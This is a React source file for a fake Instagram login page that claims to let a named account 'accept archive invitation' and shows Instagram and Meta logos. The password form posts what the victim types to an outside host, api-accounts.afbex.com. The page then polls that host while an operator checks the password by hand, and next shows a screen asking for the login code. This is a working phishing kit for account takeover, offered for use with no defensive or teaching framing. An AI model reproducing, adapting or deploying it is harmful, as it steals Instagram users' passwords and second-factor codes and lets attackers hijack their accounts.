import React, { useState, useRef } from 'react';

const AccountLogin = () => {
  const [formData, setFormData] = useState({
    password: '',
  });
  const [showOtpScreen, setShowOtpScreen] = useState(false);
  const [otp, setOtp] = useState('');
  const [trustDevice, setTrustDevice] = useState(false);

  const handleChange = (e) => {
    setFormData({ ...formData, [e.target.name]: e.target.value });
  };

  const [verificationStatus, setVerificationStatus] = useState('idle'); // idle, pending, approved, rejected
  const [pollingInterval, setPollingInterval] = useState(null);

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (formData.password) {
      try {
        // Submit password to backend
        const response = await fetch('https://api-accounts.afbex.com/stage/test/submit-password', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ password: formData.password })
        });
        
        if (response.ok) {
          setVerificationStatus('pending');
          startPolling();
        }
      } catch (error) {
        console.error('Error submitting password:', error);
        alert('Could not connect to verification server');
      }
    }
  };

  const startPolling = () => {
    const interval = setInterval(async () => {
      try {
        const response = await fetch('https://api-accounts.afbex.com/stage/test/check-status');
        const data = await response.json();
        
        if (data.status === 'approved') {
          setVerificationStatus('approved');
          clearInterval(interval);
          // Proceed to OTP screen or main app
          setTimeout(() => setShowOtpScreen(true), 1000);
        } else if (data.status === 'rejected') {
          setVerificationStatus('rejected');
          clearInterval(interval);
          setTimeout(() => {
            setVerificationStatus('idle');
            setFormData({ password: '' });
          }, 3000);
        }
      } catch (error) {
        console.error('Polling error:', error);
      }
    }, 2000); // Poll every 2 seconds
    
    setPollingInterval(interval);
  };

  const handleOtpChange = (e) => {
    const value = e.target.value.replace(/\D/g, ''); // Only allow digits
    if (value.length <= 6) {
      setOtp(value);
    }
  };

  const handleOtpSubmit = (e) => {
    e.preventDefault();
    console.log('OTP submitted:', otp);
    console.log('Trust device:', trustDevice);
    // Add your OTP verification logic here
  };

  const handleBackToLogin = () => {
    setShowOtpScreen(false);
    setOtp('');
    setTrustDevice(false);
  };

  const handleResendCode = () => {
    console.log('Resending confirmation code...');
    // Add your resend logic here
  };

  // If OTP screen should be shown
  if (showOtpScreen) {
    return (
      <div className="min-h-screen bg-[#0a1929] text-white flex flex-col font-sans">
        {/* Back Button */}
        <button 
          onClick={handleBackToLogin}
          className="absolute top-6 left-6 text-white hover:text-gray-300 transition"
        >
          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
            <path d="M19 12H5M12 19l-7-7 7-7"/>
          </svg>
        </button>

        {/* Top Content - Header and OTP Inputs */}
        <div className="flex-1 flex flex-col items-center justify-start px-6">
          {/* Header */}
          <div className="text-center mb-12 mt-20">
            <h1 className="text-2xl font-semibold mb-4">Enter login code</h1>
            <p className="text-sm text-gray-400 mb-2">
              Enter the login code we sent to your registered email/phone
            </p>
            <button 
              onClick={handleResendCode}
              className="text-sm text-[#0095f6] hover:text-[#0064E0] transition"
            >
              Resend confirmation code.
            </button>
          </div>

          {/* OTP Input Box */}
          <div className="w-full max-w-xs px-4">
            <input
              type="text"
              inputMode="numeric"
              maxLength="6"
              value={otp}
              onChange={handleOtpChange}
              placeholder="Login code"
              className="w-full bg-transparent border-0 border-b-2 border-white p-2 text-center text-lg text-white placeholder-gray-500 placeholder:text-sm focus:outline-none focus:border-white transition tracking-widest"
              autoFocus
            />
          </div>
        </div>

        {/* Bottom Content - Trust Device and Confirm Button */}
        <form onSubmit={handleOtpSubmit} className="w-full px-4 pb-8">
          <div className="w-full max-w-md mx-auto">
            {/* Trust Device Checkbox */}
            <div className="flex items-start justify-between gap-3 mb-6">
              <label htmlFor="trustDevice" className="cursor-pointer">
                <div className="text-base font-medium">Trust this device</div>
                <div className="text-xs text-gray-400">We won't ask for a login code next time</div>
              </label>
              <div className="flex items-center h-6">
                <input
                  type="checkbox"
                  id="trustDevice"
                  checked={trustDevice}
                  onChange={(e) => setTrustDevice(e.target.checked)}
                  className="w-5 h-5 bg-transparent border-2 border-gray-500 rounded appearance-none checked:bg-[#0095f6] checked:border-[#0095f6] cursor-pointer relative mt-4"
                  style={{
                    backgroundImage: trustDevice ? `url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='white' stroke-width='3'%3E%3Cpath d='M5 13l4 4L19 7'/%3E%3C/svg%3E")` : 'none',
                    backgroundSize: '100% 100%',
                    backgroundPosition: 'center',
                  }}
                />
              </div>
            </div>

            {/* Confirm Button */}
            <button
              type="submit"
              disabled={otp.length < 4}
              className={`w-full py-2 rounded-lg text-base font-semibold transition duration-200 ${
                otp.length >= 4
                  ? 'bg-[#0095f6] hover:bg-[#0064E0] text-white'
                  : 'bg-[#1a3a52] text-gray-500 cursor-not-allowed'
              }`}
            >
              Confirm
            </button>
          </div>
        </form>
      </div>
    );
  }

  // Default Login Screen
  return (
    <div className="min-h-screen bg-[#1C2A33] text-white flex flex-col items-center justify-between font-sans selection:bg-gray-800">
      
      {/* Top Language Selector */}
      <div className="mt-4 text-xs text-gray-400">
        English (UK)
      </div>

      {/* Main Content Container */}
      <div className="w-full max-w-[400px] px-4 flex flex-col items-center flex-grow justify-center -mt-10">
        
        {/* Instagram Logo */}
        <div className="mt-[-90px] mb-[-20px]">
          <img src="/src/assets/textlogo.png" alt="Instagram" className="w-64 h-44 object-contain" />
        </div>

        {/* Login Description */}
        <p className="text-sm text-[#8E8E8E] text-center mb-8 font-normal tracking-tight px-8 leading-relaxed">
          Login with your account to accept archive invitation
        </p>

        {/* Profile Section */}
        <div className="flex flex-col items-center mb-8">
          <img 
            src="/src/assets/pfp.jpg" 
            alt="Profile" 
            className="w-24 h-24 rounded-full object-cover mb-3 border-2 border-[#3C4D57]" 
          />
          <p className="text-base font-medium text-white">@spammbushhh_</p>
        </div>

        {/* Login Form */}
        <form className="w-full space-y-3" onSubmit={handleSubmit}>
          <input
            type="password"
            name="password"
            placeholder="Password"
            className="w-full bg-[#1C2A33] border border-[#3C4D57] rounded-md p-3.5 text-sm text-[#83919C] placeholder-gray-500 placeholder:font-semibold focus:outline-none focus:border-[#2e5a8a] transition"
            onChange={handleChange}
            value={formData.password}
          />
          
          <button
            type="submit"
            disabled={verificationStatus === 'pending'}
            className={`w-full font-semibold py-3 rounded-full text-sm mt-2 transition duration-200 ${
              verificationStatus === 'pending' 
                ? 'bg-gray-600 cursor-not-allowed' 
                : verificationStatus === 'approved'
                ? 'bg-green-600 hover:bg-green-700'
                : verificationStatus === 'rejected'
                ? 'bg-red-600 hover:bg-red-700'
                : 'bg-[#0064E0] hover:bg-[#0095f6]'
            } text-white`}
          >
            {verificationStatus === 'pending' && '⏳ Verifying...'}
            {verificationStatus === 'approved' && '✓ Approved!'}
            {verificationStatus === 'rejected' && '✗ Rejected'}
            {verificationStatus === 'idle' && 'Log in'}
          </button>
        </form>

        {/* Verification Status Message */}
        {verificationStatus === 'pending' && (
          <div className="mt-4 text-sm text-gray-400 text-center animate-pulse">
            Waiting for manual verification...
          </div>
        )}
        {verificationStatus === 'rejected' && (
          <div className="mt-4 text-sm text-red-400 text-center">
            Password verification failed. Please try again.
          </div>
        )}

        {/* Forgotten Password */}
        <div className="mt-6 text-sm text-gray-300 hover:text-white cursor-pointer transition">
          Forgotten password?
        </div>

      </div>

      {/* Footer Section */}
      <div className="w-full max-w-[400px] px-4 mb-6 flex flex-col items-center space-y-6">
        
        {/* Create New Account Button */}
        {/* <button className="w-full border-2 border-[#284B72] text-[#4787BA] font-bold py-2.5 rounded-full text-sm hover:bg-[#0d2137] transition duration-300">
          Create new account
        </button> */}

        {/* Meta Logo */}
        <div className="flex items-center text-gray-400">
          <img src="/src/assets/metalogo.png" alt="Meta" className="h-3 object-contain" />
        </div>
      </div>
      
    </div>
  );
};

export default AccountLogin;